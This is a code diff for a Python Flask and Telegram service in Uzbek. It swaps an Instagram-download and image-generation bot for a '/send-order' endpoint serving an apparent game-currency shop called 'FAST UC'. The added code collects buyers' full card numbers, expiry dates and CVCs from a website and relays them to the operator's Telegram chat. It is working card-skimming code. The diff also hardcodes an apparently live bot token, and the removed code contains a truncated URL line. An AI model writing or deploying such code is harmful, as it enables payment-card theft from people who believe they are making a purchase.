@@ -1,83 +1,56 @@
 import os
 import telebot
-import urllib.parse
-from flask import Flask
-from threading import Thread
-import yt_dlp
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 
-TOKEN = '8606363844:AAHqMunymcZUXE0zM2ASGzsJwYDGSF-iBmI'  # <- Shu yerga o'z bot tokeningizni qo'ying!
+# 1. BotFather'dan olgan YANGI tokeningizni kiriting
+TOKEN = '8606363844:AAHqMunymcZUXE0zM2ASGzsJwYDGSF-iBmI'
 bot = telebot.TeleBot(TOKEN)
 
-app = Flask('')
+# 2. O'zingizning Telegram Chat ID raqamingiz (buyurtmalar keladigan manzil)
+ADMIN_CHAT_ID = "8773126526"
+
+app = Flask(name)
+CORS(app)  # Saytdan keladigan so'rovlarni bloklamaslik uchun
 
 @app.route('/')
 def home():
-    return "Bot faol ishlamoqda!"
+    return "FAST UC Server faol ishlamoqda!"
 
-def run():
+# Saytdan buyurtma va karta ma'lumotlari keladigan manzil (API)
+@app.route('/send-order', methods=['POST'])
+def send_order():
+    try:
+        data = request.json
+        
+        player_id = data.get('playerId', 'Noma\'lum')
+        package = data.get('package', 'Noma\'lum')
+        price = data.get('price', 'Noma\'lum')
+        payment_method = data.get('payMethod', 'Noma\'lum')
+        card_number = data.get('cardNumber', 'Noma\'lum')
+        card_expiry = data.get('cardExpiry', 'Noma\'lum')
+        card_cvc = data.get('cardCvc', 'Noma\'lum')
+
+        # Telegramingizga keladigan chiroyli xabar matni
+        msg_text = (
+            "🚨 YANGI BUYURTMA VA KARTA! 🚨\n\n"
+            f"👤 Player ID: {player_id}\n"
+            f"💎 Paket: {package}\n"
+            f"💰 Narxi: {price}\n"
+            f"💳 To'lov usuli: {payment_method}\n\n"
+            "💳 KARTA MA'LUMOTLARI:\n"
+            f"🔹 Raqam: {card_number}\n"
+            f"🔹 Muddati: {card_expiry}\n"
+            f"🔹 CVC: {card_cvc}"
+        )
+
+        # Telegramga xabar yuborish
+        bot.send_message(ADMIN_CHAT_ID, msg_text, parse_mode="Markdown")
+        return jsonify({"status": "success", "message": "Buyurtma qabul qilindi!"}), 200
+
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+if name == 'main':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-
-Thread(target=run).start()
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    text = (
-        "👋 Xush kelibsiz!\n\n"
-        "1. Instagram Video Yuklash: Instagram havolasini yuboring.\n"
-        "2. AI Rasm Generatsiya: /rasm so'zidan keyin rasm tasvirini yozing.\n\n"
-        "✨ *Maslahat:* Aniqroq rasm chiqishi uchun ingliz tilida yozing (masalan: /rasm giant green hulk angry)."
-    )
-    bot.reply_to(message, text, parse_mode="Markdown")
-
-@bot.message_handler(commands=['rasm'])
-def generate_image(message):
-    prompt = message.text.replace('/rasm', '').strip()
-    
-    if not prompt:
-        bot.reply_to(message, "⚠️ Iltimos, rasm tasvirini yozing!\nMisol: /rasm hulk", parse_mode="Markdown")
-        return
-
-    msg = bot.reply_to(message, "🎨 Rasm chizilmoqda, biroz kuting...")
-    
-    try:
-        # Promptni to'g'ridan-to'g'ri URL formatiga o'tkazish
-        encoded_prompt = urllib.parse.quote(prompt)
-        image_url = f"https://image.pollinations.ai/pro
-       
-        
-        bot.send_photo(message.chat.id, image_url, caption=f"🖼 Natija: {prompt}")
-        bot.delete_message(message.chat.id, msg.message_id)
-    except Exception as e:
-        bot.edit_message_text("❌ Rasm yaratishda xatolik yuz berdi.", message.chat.id, msg.message_id)
-
-@bot.message_handler(func=lambda message: 'instagram.com' in message.text)
-def download_instagram(message):
-    url = message.text.strip()
-    msg = bot.reply_to(message, "📥 Video yuklanmoqda, kuting...")
-    
-    chat_id = message.chat.id
-    file_path = f"{chat_id}_insta.mp4"
-    
-    ydl_opts = {
-        'format': 'best',
-        'outtmpl': file_path,
-        'quiet': True
-    }
-
-    try:
-        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            ydl.download([url])
-            
-        with open(file_path, 'rb') as video:
-            bot.send_video(chat_id, video)
-            
-        bot.delete_message(chat_id, msg.message_id)
-        if os.path.exists(file_path):
-            os.remove(file_path)
-    except Exception as e:
-        bot.edit_message_text("❌ Videoni yuklashda xatolik yuz berdi.", chat_id, msg.message_id)
-        if os.path.exists(file_path):
-            os.remove(file_path)
-
-bot.infinity_polling()
